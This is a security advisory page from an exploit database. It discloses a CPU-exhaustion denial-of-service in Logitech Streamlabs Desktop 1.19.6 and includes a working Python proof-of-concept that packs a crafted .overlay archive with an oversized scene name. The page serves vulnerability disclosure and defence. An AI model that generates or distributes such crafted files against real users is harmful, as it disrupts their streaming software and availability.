---
title: Logitech Streamlabs Desktop 1.19.6 (overlay) CPU Exhaustion
url: https://cxsecurity.com/issue/WLB-2025110011
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-11-13
fetch_date: 2025-11-14T03:12:07.470198
---

# Logitech Streamlabs Desktop 1.19.6 (overlay) CPU Exhaustion

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Logitech Streamlabs Desktop 1.19.6 (overlay) CPU Exhaustion** **2025.11.13**  Credit:  **[LiquidWorm](https://cxsecurity.com/author/LiquidWorm/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

#!/usr/bin/env python3
#
#
# Logitech Streamlabs Desktop 1.19.6 (overlay) CPU Exhaustion
#
#
# Vendor: Logitech | General Workings, Inc.
# Product web page: https://www.logitech.com | https://www.streamlabs.com
# Affected version 1.19.6 (macOS/Win)
#
# Summary: Streamlabs Desktop is a free streaming and recording software,
# built on OBS Studio, for content creators to stream live to platforms
# like Twitch, YouTube, and Facebook. It is designed to be beginner-friendly
# and offers tools for creating engaging streams, such as customizable overlays,
# alerts for viewer interactions, and the ability to add guests to a stream.
#
# Desc: A vulnerability exists in Streamlabs Desktop where importing a
# crafted .overlay file can cause uncontrolled CPU consumption, leading
# to a denial-of-service condition. The .overlay file is an archive
# containing a config.json configuration. By inserting an excessively
# large string into the name attribute of a scene object within config.json,
# the application's renderer process (Frameworks/Streamlabs Desktop Helper
# (Renderer).app) spikes to over 150% CPU and becomes unresponsive. This
# forces the victim to terminate the application manually, resulting in
# loss of availability. An attacker could exploit this by distributing
# malicious overlay files to disrupt streaming operations.
#
# ----------------------------------------------------------------------
# $ ps ucp 66595
# USER PID %CPU %MEM VSZ RSS TT STAT STARTED TIME COMMAND
# lqwrm 66595 100.3 0.6 1596218784 221344 ?? R 2:15PM 1:32.11 Streamlabs Desktop Helper (Renderer)
# ----------------------------------------------------------------------
#
# Tested on: macOS Sequoia version 15.7.2, 15.7.1
# Microsoft Windows 11 25H2
# Microsfot Windows 10
#
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
# @zeroscience
#
#
# Advisory ID: ZSL-2025-5967
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5967.php
#
#
# 15.10.2025
#
import argparse
import json
import zipfile
from pathlib import Path
def build\_config(name: str) -> dict:
return {
"schemaVersion": 2,
"nodeType": "RootNode",
"scenes": {
"schemaVersion": 2,
"nodeType": "ScenesNode",
"items": [
{
"slots": {
"schemaVersion": 1,
"nodeType": "SlotsNode",
"items": []
},
"name": name,
"sceneId": "scene\_8e59eea4-d0f1-424f-8837-1aacd707700c"
}
]
},
"transition": {
"schemaVersion": 1,
"nodeType": "TransitionNode",
"type": "cut\_transition",
"settings": {},
"duration": 300
},
"nodeMap": {
"schemaVersion": 1,
"nodeType": "NodeMapNode"
}
}
def create\_overlay(output\_path: Path, name\_length: int = 1000) -> Path:
scene\_name = "A" \* name\_length
config\_dict = build\_config(scene\_name)
config\_bytes = json.dumps(config\_dict, indent=2, ensure\_ascii=False).encode("utf-8")
output\_path.parent.mkdir(parents=True, exist\_ok=True)
with zipfile.ZipFile(output\_path, mode="w", compression=zipfile.ZIP\_DEFLATED) as zf:
zf.writestr("config.json", config\_bytes)
return output\_path
def main():
parser = argparse.ArgumentParser(description="Create a Streamlabs .overlay with a 1000 chars scene name.")
parser.add\_argument("-o", "--output", type=Path, default=Path("sample.overlay"),
help="Path to the output .overlay archive (default: sample.overlay)")
parser.add\_argument("-n", "--name-length", type=int, default=1000,
help="Number of bytes to use for the scene name (default: 1000)")
args = parser.parse\_args()
out = create\_overlay(args.output, name\_length=args.name\_length)
print(f"Created overlay: {out.resolve()}")
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025110011)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top